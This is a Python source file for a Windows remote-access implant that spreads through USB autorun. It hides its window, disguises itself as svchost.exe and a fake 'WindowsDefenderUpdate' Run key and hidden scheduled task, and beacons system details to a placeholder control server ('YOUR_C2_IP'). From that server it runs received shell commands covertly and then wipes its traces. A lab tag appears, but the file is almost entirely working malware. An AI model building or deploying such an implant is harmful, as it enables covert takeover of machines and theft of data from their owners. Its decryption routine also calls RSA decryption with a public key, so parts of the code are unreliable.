import os
import sys
import ctypes
import socket
import base64
import time
import json
import shutil
import winreg
import random
import platform
import subprocess
import hashlib
import win32api
import win32con
import win32file
from Cryptodome.Cipher import AES, PKCS1_OAEP
from Cryptodome.PublicKey import RSA
from Cryptodome.Hash import SHA256
from Cryptodome.Util.Padding import pad, unpad

# ===== CONFIGURATION =====
C2_SERVER = "YOUR_C2_IP"  # Replace with your control server IP
C2_PORT = 443             # Standard HTTPS port
AES_KEY = hashlib.sha256(b'32-byte-ultra-secure-key-123!').digest()

# ===== RSA PUBLIC KEY (PASTE YOUR GENERATED KEY BELOW) =====
RSA_PUB_KEY = """-----BEGIN PUBLIC KEY-----
PASTE_YOUR_2048_BIT_PUBLIC_KEY_HERE
-----END PUBLIC KEY-----"""

USB_ID = "HTB_CTS_LAB_001"  # Unique identifier

def is_usb_drive():
    """Check if running from removable drive"""
    if os.name == 'nt':
        try:
            drive = os.path.splitdrive(sys.executable)[0]
            return win32file.GetDriveType(drive) == win32file.DRIVE_REMOVABLE
        except:
            return False
    return False

def setup_usb_autorun():
    """Create all necessary USB files automatically"""
    usb_path = os.path.dirname(sys.executable)
    
    if not os.path.exists(os.path.join(usb_path, 'autorun.inf')):
        with open(os.path.join(usb_path, 'autorun.inf'), 'w') as f:
            f.write("""[AutoRun]
open=launch.bat
shellexecute=launch.bat
action=Open folder to view files
label=USB Storage
icon=shell32.dll,4""")

    if not os.path.exists(os.path.join(usb_path, 'launch.bat')):
        with open(os.path.join(usb_path, 'launch.bat'), 'w') as f:
            f.write("""@echo off
start \"\" /B %~dp0payload.exe
exit""")

    if os.name == 'nt':
        subprocess.run(f'attrib +h +s {os.path.join(usb_path, "autorun.inf")}', shell=True, check=False)
        subprocess.run(f'attrib +h +s {os.path.join(usb_path, "launch.bat")}', shell=True, check=False)

def hide_execution():
    """Complete execution hiding for modern Windows"""
    if os.name == 'nt':
        # Hide console window
        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
        
        # Remove from taskbar and alt-tab
        try:
            ctypes.windll.user32.SetWindowDisplayAffinity(
                ctypes.windll.kernel32.GetConsoleWindow(),
                win32con.WDA_EXCLUDEFROMCAPTURE
            )
        except:
            pass
        
        # Spoof parent process
        try:
            kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
            kernel32.SetConsoleTitleW(u"svchost.exe")
        except:
            pass

def install_persistence():
    """Multiple persistence mechanisms with fallbacks"""
    persistence_methods = []
    
    if os.name == 'nt':
        # 1. Registry Run Key
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                0, winreg.KEY_WRITE
            )
            winreg.SetValueEx(key, "WindowsDefenderUpdate", 0, winreg.REG_SZ, sys.executable)
            winreg.CloseKey(key)
            persistence_methods.append("Registry Run Key")
        except Exception:
            pass

        # 2. Scheduled Task (More reliable)
        try:
            xml_template = f"""
            <Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
                <RegistrationInfo>
                    <Description>Windows Defender Update</Description>
                </RegistrationInfo>
                <Triggers>
                    <LogonTrigger>
                        <Enabled>true</Enabled>
                        <Delay>PT30S</Delay>
                    </LogonTrigger>
                </Triggers>
                <Principals>
                    <Principal id="Author">
                        <UserId>S-1-5-18</UserId>
                        <RunLevel>HighestAvailable</RunLevel>
                    </Principal>
                </Principals>
                <Settings>
                    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
                    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
                    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
                    <AllowHardTerminate>false</AllowHardTerminate>
                    <StartWhenAvailable>true</StartWhenAvailable>
                    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
                    <IdleSettings>
                        <StopOnIdleEnd>false</StopOnIdleEnd>
                        <RestartOnIdle>false</RestartOnIdle>
                    </IdleSettings>
                    <AllowStartOnDemand>true</AllowStartOnDemand>
                    <Enabled>true</Enabled>
                    <Hidden>true</Hidden>
                    <RunOnlyIfIdle>false</RunOnlyIfIdle>
                    <WakeToRun>false</WakeToRun>
                    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
                    <Priority>7</Priority>
                </Settings>
                <Actions Context="Author">
                    <Exec>
                        <Command>{sys.executable}</Command>
                    </Exec>
                </Actions>
            </Task>"""
            
            xml_path = os.path.join(os.environ['TEMP'], 'windows_update_task.xml')
            with open(xml_path, 'w') as f:
                f.write(xml_template)

            subprocess.run(
                ['schtasks', '/create', '/tn', 'WindowsDefenderUpdate', '/xml', xml_path, '/f'],
                creationflags=subprocess.CREATE_NO_WINDOW,
                stderr=subprocess.DEVNULL,
                stdout=subprocess.DEVNULL
            )
            os.remove(xml_path)
            persistence_methods.append("Scheduled Task")
        except Exception:
            pass

    return persistence_methods

class SecureComms:
    def __init__(self):
        self.rsa_key = RSA.import_key(RSA_PUB_KEY)
        self.aes_key = AES_KEY
    
    def encrypt(self, data):
        """Hybrid RSA-AES encryption with session keys"""
        session_key = os.urandom(32)
        iv = os.urandom(16)
        
        cipher_rsa = PKCS1_OAEP.new(self.rsa_key, hashAlgo=SHA256)
        enc_session_key = cipher_rsa.encrypt(session_key)
        
        cipher_aes = AES.new(session_key, AES.MODE_GCM, iv)
        ciphertext, tag = cipher_aes.encrypt_and_digest(pad(data.encode(), AES.block_size))
        
        return base64.b64encode(enc_session_key + iv + tag + ciphertext).decode()
    
    def decrypt(self, enc_data):
        """Decrypt hybrid encrypted messages"""
        enc_data = base64.b64decode(enc_data)
        
        rsa_size = self.rsa_key.size_in_bytes()
        enc_session_key = enc_data[:rsa_size]
        iv = enc_data[rsa_size:rsa_size+16]
        tag = enc_data[rsa_size+16:rsa_size+32]
        ciphertext = enc_data[rsa_size+32:]
        
        cipher_rsa = PKCS1_OAEP.new(self.rsa_key, hashAlgo=SHA256)
        session_key = cipher_rsa.decrypt(enc_session_key)
        
        cipher_aes = AES.new(session_key, AES.MODE_GCM, iv)
        return unpad(cipher_aes.decrypt_and_verify(ciphertext, tag), AES.block_size).decode()

def beacon_checkin():
    comms = SecureComms()
    
    system_info = {
        "hostname": platform.node(),
        "os": platform.platform(),
        "user": os.getlogin(),
        "privilege": "admin" if ctypes.windll.shell32.IsUserAnAdmin() else "user",
        "timestamp": time.time(),
        "usb_origin": is_usb_drive(),
        "process_name": os.path.basename(sys.executable)
    }
    
    while True:
        try:
            with socket.create_connection((C2_SERVER, C2_PORT), timeout=30) as s:
                s.send(comms.encrypt(json.dumps({
                    "type": "checkin",
                    "data": system_info
                })).encode())
                
                while True:
                    enc_cmd = s.recv(4096).decode().strip()
                    if not enc_cmd:
                        break
                    
                    cmd = json.loads(comms.decrypt(enc_cmd))
                    
                    if cmd.get("type") == "exec":
                        result = execute_command(cmd["data"])
                        s.send(comms.encrypt(json.dumps({
                            "type": "result",
                            "data": result
                        })).encode())
                    
                    elif cmd.get("type") == "cleanup":
                        return True
                    
                    time.sleep(random.uniform(0.5, 5.0))
        
        except Exception:
            time.sleep(random.randint(30, 300))

def execute_command(cmd):
    """Execute commands with improved error handling"""
    try:
        if cmd.startswith("cd "):
            os.chdir(cmd[3:].strip())
            return f"Changed directory to {os.getcwd()}"
        
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        
        process = subprocess.Popen(
            cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE,
            text=True,
            startupinfo=startupinfo,
            creationflags=subprocess.CREATE_NO_WINDOW
        )
        
        try:
            output, error = process.communicate(timeout=60)
            return output if output else error if error else "Command executed successfully"
        except subprocess.TimeoutExpired:
            process.kill()
            return "Command timed out"
    
    except Exception as e:
        return f"Error: {str(e)}"

def cleanup():
    """Remove all traces of the payload"""
    if os.name == 'nt':
        try:
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                0, winreg.KEY_WRITE
            )
            winreg.DeleteValue(key, "WindowsDefenderUpdate")
            winreg.CloseKey(key)
            
            subprocess.run(
                ['schtasks', '/delete', '/tn', 'WindowsDefenderUpdate', '/f'],
                creationflags=subprocess.CREATE_NO_WINDOW,
                stderr=subprocess.DEVNULL,
                stdout=subprocess.DEVNULL
            )
        except Exception:
            pass

if __name__ == "__main__":
    if is_usb_drive():
        setup_usb_autorun()
    
    hide_execution()
    persistence_methods = install_persistence()
    
    while True:
        if beacon_checkin():
            break
    
    cleanup()
    
    if hasattr(sys, '_MEIPASS'):
        try:
            shutil.rmtree(sys._MEIPASS)
        except Exception:
            pass